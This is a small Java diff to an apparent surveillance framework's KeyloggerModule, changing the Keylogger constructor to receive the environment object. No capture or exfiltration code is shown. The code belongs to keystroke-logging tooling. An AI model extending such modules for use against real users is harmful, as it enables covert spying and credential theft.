@@ -18,7 +18,7 @@ public class KeyloggerModule extends PeriodicTaskModule {
     @Override
     public synchronized void start(StingerEnvironment environment) {
         if (mKeylogger == null) {
-            mKeylogger = new Keylogger();
+            mKeylogger = new Keylogger(environment);
         }
 
         super.start(environment);
